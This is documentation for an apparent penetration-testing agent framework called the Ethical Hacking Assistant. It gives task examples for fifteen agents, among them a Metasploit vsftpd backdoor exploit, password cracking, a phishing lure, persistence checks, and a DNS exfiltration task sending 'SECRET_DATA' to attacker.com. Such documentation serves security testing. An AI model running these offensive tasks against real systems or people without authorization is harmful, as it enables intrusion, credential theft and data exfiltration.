# Agents Documentation

The Ethical Hacking Assistant is built around a modular agent system where each agent specializes in a specific aspect of penetration testing. This document provides an overview of the available agents and how to use them.

## Available Agents

### 1. Vulnerability Scanner Agent
The Vulnerability Scanner Agent scans target systems for known security vulnerabilities.

**Usage:**
```python
# Example task for vulnerability scanning
task = {
    "tool": "nmap",
    "target": "example.com",
    "options": ["-sV", "--script=vuln"]
}
vulnerability_scanner.execute_task(task)
```

### 2. Information Gathering Agent
The Information Gathering Agent collects information about target systems.

**Usage:**
```python
# Example task for DNS information gathering
task = {
    "type": "dns",
    "target": "example.com",
    "tool": "dig",
    "options": ["+short"]
}
information_gathering.execute_task(task)
```

### 3. Exploit Execution Agent
The Exploit Execution Agent executes exploits against known vulnerabilities.

**Usage:**
```python
# Example task for exploit execution
task = {
    "tool": "metasploit",
    "exploit": "exploit/unix/ftp/vsftpd_234_backdoor",
    "target": "192.168.1.10",
    "options": ["RHOSTS=192.168.1.10", "RPORT=21"]
}
exploit_execution.execute_task(task)
```

### 4. Password Cracking Agent
The Password Cracking Agent attempts to crack passwords for various services.

**Usage:**
```python
# Example task for password cracking
task = {
    "tool": "john",
    "target": "/path/to/hashes.txt",
    "wordlist": "/path/to/wordlist.txt",
    "options": ["--format=raw-md5"]
}
password_cracking.execute_task(task)
```

### 5. Web Application Analysis Agent
The Web Application Analysis Agent analyzes web applications for security issues.

**Usage:**
```python
# Example task for web application scanning
task = {
    "type": "scan",
    "target": "https://example.com",
    "tool": "nikto",
    "options": ["-Tuning", "x"]
}
web_application_analysis.execute_task(task)
```

### 6. Network Traffic Analysis Agent
The Network Traffic Analysis Agent analyzes network traffic for suspicious activity.

**Usage:**
```python
# Example task for capturing network traffic
task = {
    "type": "capture",
    "interface": "eth0",
    "options": ["-c", "100"]
}
network_traffic_analysis.execute_task(task)
```

### 7. Social Engineering Agent
The Social Engineering Agent simulates social engineering attacks.

**Usage:**
```python
# Example task for simulating phishing
task = {
    "type": "phishing",
    "target": "user@example.com",
    "message": "Click here to reset your password",
    "tool": "gophish",
    "options": ["--template", "password_reset"]
}
social_engineering.execute_task(task)
```

### 8. Agent Coordination Manager
The Agent Coordination Manager manages coordination between different agents.

**Usage:**
```python
# Example task for starting a session
task = {
    "type": "start_session",
    "name": "Example Pentest",
    "target": "example.com",
    "description": "Penetration test of example.com"
}
coordination_manager.execute_task(task)
```

### 9. Documentation Agent
The Documentation Agent generates reports and documentation for penetration tests.

**Usage:**
```python
# Example task for generating a report
task = {
    "type": "generate_report",
    "session_id": "session_12345",
    "template": "executive_summary"
}
documentation_agent.execute_task(task)
```

### 10. Malware Analysis Agent
The Malware Analysis Agent analyzes malware samples to understand their behavior.

**Usage:**
```python
# Example task for static malware analysis
task = {
    "sample_path": "/path/to/malware.exe",
    "method": "static",
    "options": []
}
malware_analysis.execute_task(task)
```

### 11. Privilege Escalation Agent
The Privilege Escalation Agent tests for privilege escalation vulnerabilities.

**Usage:**
```python
# Example task for checking sudo rights
task = {
    "target": "192.168.1.10",
    "method": "linux_sudo",
    "options": []
}
privilege_escalation.execute_task(task)
```

### 12. Wireless Network Analysis Agent
The Wireless Network Analysis Agent analyzes and attacks wireless networks.

**Usage:**
```python
# Example task for scanning wireless networks
task = {
    "type": "scan",
    "interface": "wlan0",
    "options": []
}
wireless_network_analysis.execute_task(task)
```

### 13. Persistence Agent
The Persistence Agent tests for persistence mechanisms on compromised systems.

**Usage:**
```python
# Example task for checking startup items
task = {
    "target": "192.168.1.10",
    "method": "startup_item",
    "options": []
}
persistence_agent.execute_task(task)
```

### 14. System Enumeration Agent
The System Enumeration Agent enumerates details about the target operating system.

**Usage:**
```python
# Example task for OS enumeration
task = {
    "type": "os_enum",
    "target": "192.168.1.10",
    "tool": "nmap",
    "options": ["-O"]
}
system_enumeration.execute_task(task)
```

### 15. Data Exfiltration Agent
The Data Exfiltration Agent simulates data exfiltration techniques.

**Usage:**
```python
# Example task for DNS exfiltration
task = {
    "type": "dns_exfil",
    "target": "attacker.com",
    "payload": "SECRET_DATA",
    "options": {"chunk_size": 30}
}
data_exfiltration.execute_task(task)
```

## Creating Custom Workflows

The Agent Coordination Manager can be used to create custom workflows combining multiple agents:

```python
# Example workflow for a basic penetration test
workflow = {
    "name": "Basic Pentest",
    "description": "Basic penetration test workflow",
    "tasks": [
        {
            "agent": "information_gathering",
            "task": {
                "type": "dns",
                "target": "{{params.target}}",
                "tool": "dig"
            }
        },
        {
            "agent": "vulnerability_scanner",
            "task": {
                "tool": "nmap",
                "target": "{{params.target}}",
                "options": ["-sV", "--script=vuln"]
            }
        },
        {
            "agent": "documentation",
            "task": {
                "type": "generate_report",
                "session_id": "{{params.session_id}}",
                "template": "technical_report"
            }
        }
    ]
}

# Execute the workflow
task = {
    "type": "execute_workflow",
    "workflow_id": "basic_pentest",
    "session_id": "session_12345",
    "params": {
        "target": "example.com"
    }
}
coordination_manager.execute_task(task)
```

For more detailed information about each agent, refer to the individual agent documentation files.
